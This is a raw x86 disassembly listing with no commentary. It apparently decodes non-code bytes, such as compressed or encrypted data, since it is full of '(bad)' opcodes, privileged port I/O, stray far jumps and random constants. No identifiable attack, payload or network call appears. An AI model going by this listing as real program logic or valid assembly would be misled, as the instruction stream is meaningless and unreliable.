  40ee0b:	mov    dh,0xf4
  40ee0d:	cmp    eax,0x4827013c
  40ee12:	xchg   ch,ch
  40ee14:	jno    0x40ee4e
  40ee16:	mov    cl,0x75
  40ee18:	push   esp
  40ee19:	ds xor al,0x90
  40ee1c:	xlat   BYTE PTR ds:[ebx]
  40ee1d:	fstp   TBYTE PTR ds:0x27428f46
  40ee23:	cmp    esp,ebx
  40ee25:	pop    es
  40ee26:	xchg   edi,eax
  40ee27:	(bad)  
  40ee28:	adc    esp,DWORD PTR [ebx+0x26]
  40ee2b:	cwde   
  40ee2c:	or     eax,0x4640f5fe
  40ee31:	pop    ds
  40ee32:	sbb    BYTE PTR [eax+0x7445ac13],bl
  40ee38:	sub    ebp,DWORD PTR [ebx+0x1cefdb45]
  40ee3e:	lea    esp,[ecx+0x3081c8ea]
  40ee44:	mov    ebx,0x8f8a987d
  40ee49:	in     eax,0x9d
  40ee4b:	in     al,dx
  40ee4c:	xchg   DWORD PTR [ebx+eiz*4-0x158c7183],eax
  40ee53:	leave  
  40ee54:	xor    al,0xd0
  40ee56:	inc    ebp
  40ee57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee58:	or     cl,ah
  40ee5a:	int3   
  40ee5b:	cmp    bl,BYTE PTR [eax-0x5d8807a5]
  40ee61:	sub    ah,BYTE PTR [esi+0x17]
  40ee64:	ss clc 
  40ee66:	mov    ebx,0x698caf4a
  40ee6b:	pop    esi
  40ee6c:	inc    eax
  40ee6d:	xchg   esi,eax
  40ee6e:	xor    al,0xb5
  40ee70:	icebp  
  40ee71:	out    0xe5,eax
  40ee73:	ins    BYTE PTR es:[edi],dx
  40ee74:	sbb    DWORD PTR [esi+0x53],ebp
  40ee77:	in     eax,0x3d
  40ee79:	mov    dl,0xb2
  40ee7b:	pop    esp
  40ee7c:	lock inc ebp
  40ee7e:	jae    0x40eef3
  40ee80:	fidivr WORD PTR [ecx+0x47]
  40ee83:	adc    BYTE PTR [edi],ch
  40ee85:	sub    ebx,DWORD PTR [eax-0x7b]
  40ee88:	mov    dl,0x12
  40ee8a:	sub    ebx,DWORD PTR [ebp+0x5f]
  40ee8d:	(bad)  
  40ee8e:	ja     0x40ee96
  40ee90:	ins    BYTE PTR es:[edi],dx
  40ee91:	mov    esp,0x929e1d5b
  40ee96:	pop    ebp
  40ee97:	jg     0x40ee8f
  40ee99:	pop    eax
  40ee9a:	loopne 0x40ee35
  40ee9c:	xor    eax,0xc4505591
  40eea1:	vmwrite edx,esp
  40eea4:	test   al,0x8f
  40eea6:	pop    es
  40eea7:	push   ebx
  40eea8:	xchg   esi,eax
  40eea9:	or     eax,0x2199ba66
  40eeae:	add    bl,BYTE PTR [ecx+esi*4]
  40eeb1:	sahf   
  40eeb2:	and    al,0x38
  40eeb4:	mov    ebp,0xc087b50f
  40eeb9:	ret    
  40eeba:	sbb    dh,BYTE PTR [ebx+0x52]
  40eebd:	sbb    al,0x5f
  40eebf:	or     DWORD PTR [ecx],eax
  40eec1:	iret   
  40eec2:	mov    ds:0xe6947e4b,eax
  40eec7:	push   ebx
  40eec8:	jecxz  0x40ee5e
  40eeca:	xchg   BYTE PTR [edi-0x23d37a09],bl
  40eed0:	sub    al,0x17
  40eed2:	mov    bl,0x84
  40eed4:	ds aad 0x7b
  40eed7:	push   cs
  40eed8:	push   es
  40eed9:	lock or bh,bh
  40eedc:	test   al,0x49
  40eede:	xor    esp,DWORD PTR [ebp+0x3e]
  40eee1:	imul   esi,edi,0xffffffdd
  40eee4:	mov    al,ds:0x687a5550
  40eee9:	sub    eax,0xd4a592f7
  40eeee:	loop   0x40eecf
  40eef0:	xchg   ebp,eax
  40eef1:	aam    0x5d
  40eef3:	outs   dx,DWORD PTR ds:[esi]
  40eef4:	or     ah,BYTE PTR [edi-0x5f]
  40eef7:	ins    DWORD PTR es:[edi],dx
  40eef8:	jae    0x40ef77
  40eefa:	cli    
  40eefb:	psubq  mm0,QWORD PTR [edx]
  40eefe:	aaa    
  40eeff:	loopne 0x40ef2b
  40ef01:	es xchg edx,eax
  40ef03:	jmp    0xeaf1b789
  40ef08:	mov    ecx,0x40924c6d
  40ef0d:	retf   0xc1e4
  40ef10:	fs push esp
  40ef12:	fadd   st,st(6)
  40ef14:	mov    ds:0x55eb712e,eax
  40ef19:	fcomp  QWORD PTR [ebx+0x62230b4f]
  40ef1f:	or     DWORD PTR [ecx-0x34],edi
  40ef22:	shl    DWORD PTR [ecx],1
  40ef24:	into   
  40ef25:	xchg   esi,eax
  40ef26:	das    
  40ef27:	dec    ebx
  40ef28:	mov    ebp,0xc8ceb31c
  40ef2d:	scas   al,BYTE PTR es:[edi]
  40ef2e:	inc    ecx
  40ef2f:	in     eax,0x34
  40ef31:	pusha  
  40ef32:	jp     0x40eee5
  40ef34:	sub    al,0xa4
  40ef36:	inc    edx
  40ef37:	inc    ecx
  40ef38:	es push ebp
  40ef3a:	push   edi
  40ef3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef3c:	sub    DWORD PTR ds:0x44be66d3,esp
  40ef42:	dec    edx
  40ef43:	iret   
  40ef44:	ss jae 0x40ef8a
  40ef47:	popf   
  40ef48:	loop   0x40eeee
  40ef4a:	cmp    DWORD PTR [ecx+0x66c83ee9],0xf6643328
  40ef54:	sti    
  40ef55:	push   cs
  40ef56:	jnp    0x40ef95
  40ef58:	aad    0x12
  40ef5a:	push   ebx
  40ef5b:	or     bl,BYTE PTR [ecx]
  40ef5d:	mov    eax,0x11d65d1
  40ef62:	or     esp,DWORD PTR [esi-0x3e]
  40ef65:	rcl    dh,cl
  40ef67:	cmp    DWORD PTR [ecx+0x6],ebx
  40ef6a:	popf   
  40ef6b:	aas    
  40ef6c:	pusha  
  40ef6d:	cmp    esi,DWORD PTR [ebp-0x13]
  40ef70:	test   eax,0x33af4a81
  40ef75:	xchg   DWORD PTR [eax],ecx
  40ef77:	pop    ebp
  40ef78:	imul   BYTE PTR [eax-0x39]
  40ef7b:	cmc    
  40ef7c:	mov    al,ds:0x6cbcca29
  40ef81:	fisttp QWORD PTR [ebp-0x5dda1058]
  40ef87:	adc    eax,0x260c08a8
  40ef8c:	addr16 fs daa 
  40ef8f:	lahf   
  40ef90:	daa    
  40ef91:	add    eax,0x6228abd9
  40ef96:	mov    edi,ds
  40ef98:	es data16 stos BYTE PTR es:[edi],al
  40ef9b:	arpl   WORD PTR [ebx],si
  40ef9d:	clc    
  40ef9e:	mov    ch,0x51
  40efa0:	mov    cl,0x89
  40efa2:	outs   dx,DWORD PTR es:[esi]
  40efa4:	sbb    esi,DWORD PTR [ebx+ecx*2]
  40efa7:	rcr    BYTE PTR [edi+eax*4],0xd
  40efab:	add    bl,dl
  40efad:	jmp    0xe5f2:0x3b29e88e
  40efb4:	inc    edx
  40efb5:	stc    
  40efb6:	and    eax,0xc1fd8777
  40efbb:	sbb    BYTE PTR [ecx+ebx*4],ch
  40efbe:	or     al,0x92
  40efc0:	jg     0x40ef4b
  40efc2:	pop    ss
  40efc3:	stc    
  40efc4:	jmp    0x40f019
  40efc6:	cmp    BYTE PTR [edx],bl
  40efc8:	push   ebp
  40efc9:	int3   
  40efca:	int3   
  40efcb:	pop    ebp
  40efcc:	sahf   
  40efcd:	stc    
  40efce:	mov    bh,0x49
  40efd0:	bndldx bnd1,ds:[edx-0x4e4cf691]
  40efd8:	fdiv   DWORD PTR [ebp+0x420e2db0]
  40efde:	mov    BYTE PTR [edi+edi*8+0x7a532605],dh
  40efe5:	cld    
  40efe6:	popf   
  40efe7:	push   0xffc337cd
  40efec:	mov    al,ds:0x1a452783
  40eff1:	pop    edi
  40eff2:	ret    
  40eff3:	fldenv [ecx-0x70]
  40eff6:	xor    cl,bl
  40eff8:	mov    eax,0x41b3b9e3
  40effd:	nop
  40effe:	lea    ebp,[ebp+0x73]
  40f001:	repz fmulp st(3),st
  40f004:	mov    gs,WORD PTR [ebx]
  40f006:	iret   
  40f007:	cmp    DWORD PTR [esi+0x224431f2],esi
  40f00d:	dec    esp
  40f00e:	adc    ah,bh
  40f010:	push   edx
  40f011:	push   ebp
  40f012:	sbb    BYTE PTR [eax-0x22],cl
  40f015:	add    eax,0xa0eccd48
  40f01a:	lds    ebp,FWORD PTR [esi]
  40f01c:	and    eax,DWORD PTR [eax]
  40f01e:	xor    BYTE PTR [edx-0x5],dh
  40f021:	mov    ecx,0xf27e5c49
  40f026:	adc    edi,esp
  40f028:	pop    edx
  40f029:	pusha  
  40f02a:	inc    eax
  40f02b:	in     eax,dx
  40f02c:	lea    esp,[ebp+0x2e2140b4]
  40f032:	ja     0x40f037
  40f034:	push   cs
  40f035:	adc    esi,DWORD PTR [esi+0x58aed729]
  40f03b:	je     0x40f041
  40f03d:	fdiv   st,st(7)
  40f03f:	call   DWORD PTR [ecx-0x2c]
  40f042:	jo     0x40f0b1
  40f044:	imul   ebx,DWORD PTR [ebp+esi*8-0x7a],0x65
  40f049:	adc    eax,0x2ea154eb
  40f04e:	or     BYTE PTR [esi],dh
  40f050:	jl     0x40f043
  40f052:	pop    es
  40f053:	lock jo 0x40f0bf
  40f056:	fst    DWORD PTR [edx]
  40f058:	mov    ch,dh
  40f05a:	ret    0x14cf
  40f05d:	dec    ecx
  40f05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f05f:	int3   
  40f060:	and    al,0x0
  40f062:	shr    cl,0x1c
  40f065:	dec    esi
  40f066:	inc    eax
  40f067:	push   esp
  40f068:	and    DWORD PTR [eax],ecx
  40f06a:	push   ss
  40f06b:	je     0x40f0e7
  40f06d:	or     eax,0x359fcc46
  40f072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f073:	sbb    al,0x64
  40f075:	iret   
  40f076:	fcom   DWORD PTR [ecx-0x3168d095]
  40f07c:	inc    edx
  40f07d:	(bad)  
  40f07e:	push   ds
  40f07f:	cmp    esi,ebx
  40f081:	pop    ss
  40f082:	cdq    
  40f083:	stos   BYTE PTR es:[edi],al
  40f084:	into   
  40f085:	dec    esp
  40f086:	xchg   ah,bh
  40f088:	shr    DWORD PTR [eax+0x38],0x2e
  40f08c:	iret   
  40f08d:	call   0x48c0:0x8d5bb597
  40f094:	(bad)  
  40f095:	mov    al,ds:0x7edf79e5
  40f09a:	mov    al,ds:0xed5d1b8b
  40f09f:	(bad)  
  40f0a0:	jmp    0x4b5dddd0
  40f0a5:	inc    ebp
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	xor    al,dl
  40f0a9:	mov    esi,0x6306b78d
  40f0ae:	xor    al,0x6c
  40f0b0:	sub    DWORD PTR [ebp+ecx*1+0x63],0xffffff9f
  40f0b5:	neg    BYTE PTR [eax]
  40f0b7:	mov    ebp,edi
  40f0b9:	or     DWORD PTR [edi-0x3e],edx
  40f0bc:	idiv   DWORD PTR [ecx]
  40f0be:	cmp    esp,esp
  40f0c0:	sar    DWORD PTR [ecx-0x5d81928a],cl
  40f0c6:	mov    esi,0x97b792ae
  40f0cb:	fldenv [eax+0x1f]
  40f0ce:	inc    eax
  40f0cf:	xchg   DWORD PTR [edi],esi
  40f0d1:	imul   ebx,DWORD PTR [ebp+0x5ce40399],0xb3b9bd08
  40f0db:	xchg   esp,eax
  40f0dc:	mov    dl,0xea
  40f0de:	adc    BYTE PTR [eax],dl
  40f0e0:	loop   0x40f0e9
  40f0e2:	pop    es
  40f0e3:	xchg   esp,eax
  40f0e4:	mov    al,0xbc
  40f0e6:	pop    ds
  40f0e7:	pop    ebx
  40f0e8:	jge    0x40f08f
  40f0ea:	in     eax,dx
  40f0eb:	xchg   esp,eax
  40f0ec:	enter  0x60b1,0x9a
  40f0f0:	jle    0x40f0a1
  40f0f2:	add    eax,0x129aeb15
  40f0f7:	pop    esi
  40f0f8:	(bad)  
  40f0f9:	pop    edx
  40f0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0fb:	enter  0x2515,0x4e
  40f0ff:	sbb    BYTE PTR [esi],ah
  40f101:	popf   
  40f102:	pop    ss
  40f103:	mov    ds:0xdb93104c,eax
  40f108:	jno    0x40f09a
  40f10a:	test   DWORD PTR [esi],edx
  40f10c:	pop    es
  40f10d:	ss jnp 0x40f0db
  40f110:	sar    dl,0x1f
  40f113:	push   eax
  40f114:	call   0x4898:0xbefa9fe1
  40f11b:	loop   0x40f121
  40f11d:	outs   dx,BYTE PTR ds:[esi]
  40f11e:	out    dx,al
  40f11f:	jl     0x40f18b
  40f121:	xor    BYTE PTR [esi-0x54],ch
  40f124:	cld    
  40f125:	pop    esi
  40f126:	fisub  DWORD PTR [edi+0x32]
  40f129:	jb     0x40f125
  40f12b:	or     edx,DWORD PTR [eax+0x297c9187]
  40f131:	mov    dl,BYTE PTR [ecx+0x7e]
  40f134:	cmp    eax,0xee993df1
  40f139:	mov    DWORD PTR [eax+ecx*2-0x5491c18e],ecx
  40f140:	stc    
  40f141:	test   al,0xf0
  40f143:	je     0x40f0f8
  40f145:	dec    esi
  40f146:	add    bl,BYTE PTR [esp+ebx*1-0x44]
  40f14a:	and    BYTE PTR [esi+0x678e7816],cl
  40f150:	jge    0x40f1a6
  40f152:	jbe    0x40f125
  40f154:	shr    BYTE PTR [edx],1
  40f156:	(bad)  
  40f157:	adc    al,0xf3
  40f159:	ins    DWORD PTR es:[edi],dx
  40f15a:	fisttp QWORD PTR [ecx-0x3]
  40f15d:	mov    eax,ds:0x318344d0
  40f162:	add    BYTE PTR [esi-0x73],dh
  40f165:	mov    eax,0x23856bb5
  40f16a:	arpl   sp,cx
  40f16c:	jle    0x40f107
  40f16e:	jbe    0x40f10e
  40f170:	and    dl,ah
  40f172:	inc    esp
  40f173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f175:	fs fwait
  40f177:	out    dx,eax
  40f178:	es icebp 
  40f17a:	gs pop es
  40f17c:	xor    eax,0x50ab80f
  40f181:	push   es
  40f182:	jg     0x40f1c2
  40f184:	cdq    
  40f185:	repz jnp 0x40f146
  40f188:	push   ds
  40f189:	lds    edi,FWORD PTR [eax-0x739c90ed]
  40f18f:	inc    edi
  40f190:	rcr    DWORD PTR [ecx],cl
  40f192:	fist   WORD PTR ds:0x34eda5d9
  40f198:	(bad)  
  40f199:	mov    eax,ds:0x62b850f3
  40f19e:	xor    BYTE PTR [ecx],bh
  40f1a0:	icebp  
  40f1a1:	add    DWORD PTR [ebp-0x3],edi
  40f1a4:	pop    ds
  40f1a5:	dec    edx
  40f1a6:	mov    dh,0x94
  40f1a8:	in     eax,dx
  40f1a9:	inc    edx
  40f1aa:	enter  0x402b,0xfa
  40f1ae:	mov    BYTE PTR [eax-0x2a],cl
  40f1b1:	cmp    DWORD PTR [edx],edi
  40f1b3:	and    bl,dh
  40f1b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b6:	cmc    
  40f1b7:	inc    ebx
  40f1b8:	push   esi
  40f1b9:	les    esp,FWORD PTR [ebp-0x7d]
  40f1bc:	xchg   esi,eax
  40f1bd:	mov    esi,0x50a9c6cb
  40f1c2:	lea    ecx,[eax+0x2b551bb4]
  40f1c8:	xor    bh,0x83
  40f1cb:	repnz mov dl,0x9a
  40f1ce:	call   0x28b56a77
  40f1d3:	push   es
  40f1d4:	and    dh,BYTE PTR [esi]
  40f1d6:	push   ecx
  40f1d7:	sar    edi,cl
  40f1d9:	rcl    BYTE PTR [ebp-0x42036030],cl
  40f1df:	fcom   DWORD PTR [edi]
  40f1e1:	test   BYTE PTR cs:[edx+ebp*1],cl
  40f1e5:	sbb    eax,0x54311e2a
  40f1ea:	shl    DWORD PTR [edx+0x55],0x41
  40f1ee:	dec    ebx
  40f1ef:	jmp    FWORD PTR [ebp+edi*1+0x629b22ae]
  40f1f6:	frstor [edx+0x4caa40b7]
  40f1fc:	xchg   edx,eax
  40f1fd:	(bad)  
  40f1fe:	pop    edi
  40f1ff:	cwde   
  40f200:	mov    bh,BYTE PTR [esi+0x6abf96f8]
  40f206:	int3   
  40f207:	imul   ebp,DWORD PTR ss:[eax+0x28700944],0x53ab8cc2
  40f212:	sbb    ebx,edx
  40f214:	es xor ch,ch
  40f217:	dec    eax
  40f218:	sbb    BYTE PTR [eax-0x7c74b007],dh
  40f21e:	pusha  
  40f21f:	inc    eax
  40f220:	mov    ds:0xf3bce192,al
  40f225:	iret   
  40f226:	and    al,dl
  40f228:	cmovb  esi,DWORD PTR [ecx+0x67]
  40f22c:	pop    ebp
  40f22d:	and    DWORD PTR [ebx],ebp
  40f22f:	dec    ecx
  40f230:	lahf   
  40f231:	jo     0x40f22d
  40f233:	shl    DWORD PTR [ebx+0x504211a7],1
  40f239:	ss mov dl,0x8b
  40f23c:	push   ss
  40f23d:	repz mov esi,0x62ef7b7e
  40f243:	or     BYTE PTR [edi+edi*1-0x3d0416fa],al
  40f24a:	jmp    0x40f289
  40f24c:	adc    eax,0x602c5db6
  40f251:	in     al,0xe6
  40f253:	std    
  40f254:	mov    ds:0xd25f5f81,al
  40f259:	pop    eax
  40f25a:	xchg   ebp,eax
  40f25b:	xlat   BYTE PTR ds:[ebx]
  40f25c:	push   eax
  40f25d:	mov    ebx,0x45b977b9
  40f262:	aas    
  40f263:	cmp    eax,0x74dc4fdc
  40f268:	add    al,0x1c
  40f26a:	mov    edi,0x8180123b
  40f26f:	pop    es
  40f270:	inc    ebx
  40f271:	(bad)  
  40f273:	push   ecx
  40f274:	sti    
  40f275:	push   ss
  40f276:	mov    cl,0x85
  40f278:	pop    esp
  40f279:	push   ss
  40f27a:	sti    
  40f27b:	adc    BYTE PTR [ecx+0x2e],0x4b
  40f27f:	aas    
  40f280:	idiv   DWORD PTR [edi]
  40f282:	or     eax,0x3bdc1d57
  40f287:	inc    ebp
  40f288:	xchg   esi,eax
  40f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28a:	mov    dh,BYTE PTR [ecx-0x4f0408a2]
  40f290:	(bad)  
  40f291:	sbb    BYTE PTR [edx+ebp*2+0x1d],al
  40f295:	push   cs
  40f296:	or     bh,BYTE PTR [edx+0x74194e92]
  40f29c:	pop    edx
  40f29d:	fnstsw WORD PTR [ebp+0xb]
  40f2a0:	jne    0x40f2ec
  40f2a2:	pop    eax
  40f2a3:	or     eax,0x48ade647
  40f2a8:	jg     0x40f240
  40f2aa:	retf   0x6c15
  40f2ad:	and    DWORD PTR [esi+0x42ea0695],0xfffffffb
  40f2b4:	jp     0x40f23a
  40f2b6:	pushf  
  40f2b7:	sub    ebp,esp
  40f2b9:	jbe    0x40f245
  40f2bb:	and    DWORD PTR [ecx],ebx
  40f2bd:	push   edi
  40f2be:	push   edi
  40f2bf:	mov    esp,0x5e0db6ac
  40f2c4:	daa    
  40f2c5:	and    eax,0x919ad239
  40f2ca:	js     0x40f25a
  40f2cc:	sbb    eax,0xc3177c62
  40f2d1:	and    DWORD PTR [edi+eax*1+0x5e],edi
  40f2d5:	adc    DWORD PTR [esi],ebp
  40f2d7:	out    0xc7,al
  40f2d9:	retf   0xce69
  40f2dc:	aas    
  40f2dd:	int    0x61
  40f2df:	pop    ebx
  40f2e0:	scas   eax,DWORD PTR es:[edi]
  40f2e1:	pop    ss
  40f2e2:	cli    
  40f2e3:	sbb    DWORD PTR [esi+0x4e],0x16
  40f2e7:	sbb    eax,0x85f8e366
  40f2ec:	fwait
  40f2ed:	dec    ebx
  40f2ee:	fisubr WORD PTR [edx]
  40f2f0:	enter  0x493f,0xe3
  40f2f4:	cmp    BYTE PTR [eax],0x93
  40f2f7:	mov    ds:0xca10cd8d,eax
  40f2fc:	mov    edi,0xd960ff1b
  40f301:	sar    ah,1
  40f303:	inc    ebx
  40f304:	fdecstp 
  40f306:	pop    esi
  40f307:	test   eax,0x4c89d55
  40f30c:	inc    esp
  40f30d:	and    ecx,ebp
  40f30f:	test   DWORD PTR [ebx+0x45],edx
  40f312:	add    DWORD PTR [ebx],edi
  40f314:	mov    edx,ss
  40f316:	cld    
  40f317:	sbb    eax,0x6fd06fc6
  40f31c:	pop    ds
  40f31d:	pop    ebp
  40f31e:	scas   al,BYTE PTR es:[edi]
  40f31f:	mov    bh,0x27
  40f321:	jp     0x40f369
  40f323:	lods   eax,DWORD PTR ds:[esi]
  40f324:	loop   0x40f343
  40f326:	mov    ecx,DWORD PTR [esi+eiz*4-0x61ad8047]
  40f32d:	pop    ebx
  40f32e:	(bad)  
  40f32f:	popa   
  40f330:	ficom  WORD PTR [esi-0x35]
  40f333:	push   ebp
  40f334:	sti    
  40f335:	sub    al,0xa9
  40f337:	xor    al,0x28
  40f339:	lea    ecx,[ebx-0x18fb2a1c]
  40f33f:	(bad)  
  40f340:	stc    
  40f341:	sub    al,0xbb
  40f343:	xor    DWORD PTR [ebx],edx
  40f345:	sbb    BYTE PTR [edx+0x63ad2920],0x8c
  40f34c:	jno    0x40f2f8
  40f34e:	std    
  40f34f:	imul   ebx,DWORD PTR [eax-0x72],0xffffff8d
  40f353:	mov    bl,0x31
  40f355:	out    0x4b,eax
  40f357:	inc    esi
  40f358:	and    al,0x63
  40f35a:	outs   dx,DWORD PTR ds:[esi]
  40f35b:	sbb    ecx,DWORD PTR [ebx+0x75787ffc]
  40f361:	dec    eax
  40f362:	xchg   ebp,eax
  40f363:	pop    edx
  40f364:	out    0xdc,eax
  40f366:	jnp    0x40f3d6
  40f368:	jge    0x40f330
  40f36a:	lock rcl eax,cl
  40f36d:	inc    edx
  40f36e:	push   esp
  40f36f:	inc    edx
  40f370:	out    0xcb,al
  40f372:	pop    es
  40f373:	(bad)
  40f376:	xor    DWORD PTR [edx+ebx*8-0x4e],0x285b2f08
  40f37e:	sbb    ch,0x6a
  40f381:	ds inc ebx
  40f383:	sub    eax,ecx
  40f385:	push   ss
  40f386:	pop    ds
  40f387:	push   ebx
  40f388:	dec    esi
  40f389:	dec    ebp
  40f38a:	sahf   
  40f38b:	std    
  40f38c:	sbb    BYTE PTR [esi-0x28b49af0],ch
  40f392:	push   es
  40f393:	icebp  
  40f394:	cdq    
  40f395:	popf   
  40f396:	aam    0x81
  40f398:	mov    eax,0x87184306
  40f39d:	jl     0x40f3d2
  40f39f:	xor    eax,0xd96d786e
  40f3a4:	sub    dl,BYTE PTR [edx+0x57a9dd7f]
  40f3aa:	aaa    
  40f3ab:	xchg   ebp,ebp
  40f3ad:	or     ah,BYTE PTR [ecx-0x7de3473d]
  40f3b3:	pushf  
  40f3b4:	push   ss
  40f3b5:	mov    edi,0x2e19d7d6
  40f3ba:	sub    esp,DWORD PTR [eax+0x71]
  40f3bd:	or     DWORD PTR [ebx-0x2d25ed1c],esp
  40f3c3:	cmp    esp,ecx
  40f3c5:	mov    esi,DWORD PTR [edi-0x6d]
  40f3c8:	pop    es
  40f3c9:	test   BYTE PTR [edx+0x67ffb079],dl
  40f3cf:	add    bl,dl
  40f3d1:	nop
  40f3d2:	pop    es
  40f3d3:	mov    BYTE PTR [edx-0x56],dl
  40f3d6:	xchg   ecx,eax
  40f3d7:	out    0xd2,al
  40f3d9:	jecxz  0x40f39e
  40f3db:	lds    esi,FWORD PTR [esi+esi*1]
  40f3de:	inc    ecx
  40f3df:	ds dec edx
  40f3e1:	dec    edx
  40f3e2:	fmul   DWORD PTR [edx]
  40f3e4:	sbb    DWORD PTR es:[edx+0x4f308bbd],ecx
  40f3eb:	(bad)  
  40f3ec:	lock mov ch,0xd6
  40f3ef:	cwde   
  40f3f0:	pop    ss
  40f3f1:	mov    ?,WORD PTR ds:0x75e1dcb1
  40f3f7:	into   
  40f3f8:	(bad)  
  40f3f9:	fnstenv [eax]
  40f3fb:	sub    ebp,DWORD PTR [ecx]
  40f3fd:	(bad)  
  40f3ff:	not    DWORD PTR [eax-0x50]
  40f402:	ret    
  40f403:	sbb    DWORD PTR [edx],edi
  40f405:	cmp    dh,bl
  40f407:	inc    edi
  40f408:	jno    0x40f390
  40f40a:	and    esi,DWORD PTR [edx]
  40f40c:	or     ebx,eax
  40f40e:	pop    ebx
  40f40f:	lock loopne 0x40f3ec
  40f412:	ss pop ecx
  40f414:	inc    BYTE PTR ds:0x7d719bd4
  40f41a:	int    0x12
  40f41c:	addr16 adc eax,0x1be35562
  40f422:	lahf   
  40f423:	retf   
  40f424:	xchg   esp,eax
  40f425:	pop    esi
  40f426:	mov    bl,0x9e
  40f428:	inc    ebx
  40f429:	imul   esi,DWORD PTR [ebx],0xa09aa123
  40f42f:	scas   eax,DWORD PTR es:[edi]
  40f430:	adc    eax,0xbc9c7b06
  40f435:	adc    eax,0xc1b1014a
  40f43a:	inc    BYTE PTR [edi-0x2bb63267]
  40f440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f441:	test   cl,cl
  40f443:	push   edi
  40f444:	pop    ebx
  40f445:	push   0x79
  40f447:	xor    dh,BYTE PTR ds:0xdeb90c4c
  40f44d:	xchg   ebx,eax
  40f44e:	push   eax
  40f44f:	inc    esp
  40f450:	loop   0x40f49b
  40f452:	test   al,0x46
  40f454:	int3   
  40f455:	outs   dx,DWORD PTR ds:[esi]
  40f456:	dec    eax
  40f457:	xchg   ebp,eax
  40f458:	or     al,BYTE PTR [eax-0x251ce612]
  40f45e:	pop    esi
  40f45f:	dec    edx
  40f460:	mov    cl,0x90
  40f462:	out    0xc,eax
  40f464:	add    al,0xa1
  40f466:	pop    esp
  40f467:	inc    edi
  40f468:	inc    ecx
  40f469:	call   0xb7bb:0xb1b8715f
  40f470:	aas    
  40f471:	mov    bl,0x59
  40f473:	xor    BYTE PTR [esi-0x49],cl
  40f476:	daa    
  40f477:	and    BYTE PTR [ebx+0x3c],0x3d
  40f47b:	xchg   ecx,eax
  40f47c:	add    ebp,esp
  40f47e:	xchg   ebx,eax
  40f47f:	mov    cl,0x6a
  40f481:	cmp    cl,ah
  40f483:	mov    dl,0x1e
  40f485:	adc    ebx,eax
  40f487:	push   ebx
  40f488:	sbb    edi,DWORD PTR [esi-0x1d0e17b8]
  40f48e:	ins    DWORD PTR es:[edi],dx
  40f48f:	xor    eax,0x1c5263ec
  40f494:	jnp    0x40f4b6
  40f496:	mov    ?,WORD PTR [eax]
  40f498:	fisubr DWORD PTR [eax+eiz*2+0x45]
  40f49c:	mov    al,0xac
  40f49e:	push   esp
  40f49f:	pop    ebx
  40f4a0:	dec    ecx
  40f4a1:	ret    0xdb62
  40f4a4:	dec    edx
  40f4a5:	push   ecx
  40f4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a7:	das    
  40f4a8:	jp     0x40f4f8
  40f4aa:	cmp    eax,0x62dfe9de
  40f4af:	scas   eax,DWORD PTR es:[edi]
  40f4b0:	and    esi,DWORD PTR [esi+0x4e]
  40f4b3:	popf   
  40f4b4:	sbb    dh,ah
  40f4b6:	or     eax,0x418ac2e8
  40f4bb:	push   ecx
  40f4bc:	and    al,0x69
  40f4be:	test   eax,0x5457067
  40f4c3:	call   0x4120ece1
  40f4c8:	xchg   ebp,eax
  40f4c9:	punpcklwd mm6,mm1
  40f4cc:	pop    ds
  40f4cd:	xchg   esp,eax
  40f4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4cf:	out    0xa5,eax
  40f4d1:	test   al,0x4e
  40f4d3:	and    DWORD PTR ds:0x56db2a51,0x4a3cf94d
  40f4dd:	jg     0x40f515
  40f4df:	mov    eax,ds:0x9260ae1f
  40f4e4:	jnp    0x40f46f
  40f4e6:	xchg   DWORD PTR [edx-0x2b],esp
  40f4e9:	mov    bl,0xda
  40f4eb:	and    edx,DWORD PTR [ebx-0x49]
  40f4ee:	popf   
  40f4ef:	cwde   
  40f4f0:	mov    ebx,0xf89547d0
  40f4f5:	stos   DWORD PTR es:[edi],eax
  40f4f6:	cmp    DWORD PTR [edx],0x1821e302
  40f4fc:	pop    ebp
  40f4fd:	jmp    0x40f4f6
  40f4ff:	mov    cs,WORD PTR [ebp+0x17]
  40f502:	xor    BYTE PTR [ebx+ebx*1+0x57e375cb],0x79
  40f50a:	adc    al,0x6a
  40f50c:	repnz ins WORD PTR es:[edi],dx
  40f50f:	faddp  st(3),st
  40f511:	scas   eax,DWORD PTR es:[edi]
  40f512:	mov    ah,0xdb
  40f514:	add    DWORD PTR [edi-0x189716df],esi
  40f51a:	mov    esi,0x1bebc56c
  40f51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f520:	adc    eax,0x1343eff4
  40f525:	cmp    eax,0xa339d40f
  40f52a:	jp     0x40f50a
  40f52c:	mov    gs:0xdf6d5fc7,al
  40f532:	in     al,0xb7
  40f534:	adc    ecx,DWORD PTR [ebp+0x4c]
  40f537:	hlt    
  40f538:	jno    0x40f595
  40f53a:	xor    al,bl
  40f53c:	(bad)  [ecx-0x16]
  40f53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f540:	mov    ds:0x80f80c7,al
  40f545:	mov    eax,DWORD PTR [eax]
  40f547:	data16 mov dh,0x71
  40f54a:	pusha  
  40f54b:	ror    BYTE PTR [edi+0x577ce803],0x4
  40f552:	mov    ?,WORD PTR [ebx+0x13db0f34]
  40f558:	pop    ecx
  40f559:	js     0x40f577
  40f55b:	sub    eax,DWORD PTR [edx+0x215ffe1]
  40f561:	cli    
  40f562:	jmp    0x337c532e
  40f567:	or     eax,0xff7dadc9
  40f56c:	mov    edx,0x2bd67fea
  40f571:	inc    eax
  40f572:	and    eax,0x67fd374b
  40f577:	out    dx,al
  40f578:	lds    ebp,FWORD PTR [esi]
  40f57a:	jp     0x40f504
  40f57c:	mov    ecx,0x78cd4010
  40f581:	push   0xfe9ad31a
  40f586:	call   0x24c:0x25f5bfd3
